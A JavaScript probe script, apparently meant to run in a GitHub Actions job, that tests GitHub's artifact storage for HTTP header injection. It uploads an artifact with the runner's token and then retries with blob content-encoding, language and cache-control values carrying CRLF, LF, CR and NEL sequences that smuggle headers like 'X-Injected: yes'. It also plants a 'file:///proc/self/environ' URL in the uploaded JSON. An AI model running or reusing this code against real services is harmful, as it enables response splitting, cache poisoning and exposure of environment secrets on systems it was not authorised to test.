import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY, runId=process.env.GITHUB_RUN_ID, token=process.env.GITHUB_TOKEN;
const body=Buffer.from(JSON.stringify({full_name:`${repo}/x`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'crlf',stargazers_count:0}));
const sha=b=>createHash('sha256').update(b).digest('hex');
const nel=Buffer.from([0x85]);
function req(url,method='GET',body=null,headers={}){return new Promise((resolve,reject)=>{const t=new URL(url);const mod=t.protocol==='https:'?https:http;
  const r=mod.request(t,{method,headers,timeout:25000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(c)}));});
  r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();});}

const name=`crlf-${runId}`;
const created=await client.CreateArtifact({...ids,name,version:7,mimeType:StringValue.create({value:'application/json'})});
if(!created.ok){console.log('CRLF create failed');process.exit(0);}
const uploadUrl=created.signedUploadUrl;
const placeholder=Buffer.from('{}');
async function put(props){
  const headers={'x-ms-version':'2025-01-05','x-ms-blob-type':'BlockBlob','Content-Length':String(body.length),'x-ms-blob-content-type':'application/json'};
  for(const [k,v] of Object.entries(props)) headers[k]=v;
  const r=await req(uploadUrl,'PUT',body,headers);
  return {status:r.status,headers:r.headers,raw:r.body.toString('latin1').slice(0,200)};
}
let first=await put({'x-ms-blob-content-type':'application/json'});
const fin=await client.FinalizeArtifact({...ids,name,size:String(body.length),hash:StringValue.create({value:`sha256:${sha(body)}`})});
const id=String(fin.artifactId);
async function download(){
  const api=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'crlfprobe'});
  if(!api.headers.location) return {api:api.status,body:api.body.toString('latin1').slice(0,120)};
  const f=await req(api.headers.location);
  return {api:api.status,status:f.status,rawHeaders:f.rawHeaders,bodyMatch:f.body.equals(body)};
}
const variants=[
 ['enc-crlf',{'x-ms-blob-content-encoding':'gzip\r\nX-Injected: yes'}],
 ['enc-lf',{'x-ms-blob-content-encoding':'gzip\nX-Injected: yes'}],
 ['enc-cr',{'x-ms-blob-content-encoding':'gzip\rX-Injected: yes'}],
 ['enc-blank',{'x-ms-blob-content-encoding':'gzip\r\n\r\nX-Body: injected'}],
 ['enc-ct',{'x-ms-blob-content-encoding':'gzip\r\nContent-Type: application/json'+String.fromCharCode(0x85)}],
 ['lang-crlf',{'x-ms-blob-content-language':'en\r\nX-Injected: yes'}],
 ['cache-crlf',{'x-ms-blob-cache-control':'max-age=0\r\nX-Injected: yes'}],
 ['enc-nel',{'x-ms-blob-content-encoding':'gzip'+String.fromCharCode(0x85)}],
];
for(const [label,props] of variants){
  const rec={label};
  try{const p=await put(props);rec.putStatus=p.status;rec.putErr=p.headers['x-ms-error-code'];if(p.status!==201){rec.putBody=p.raw;console.log('CRLF',JSON.stringify(rec));continue;}
    const d=await download();rec.dl=d; }catch(e){rec.err=String(e.message).slice(0,200);}
  console.log('CRLF',JSON.stringify(rec));
}
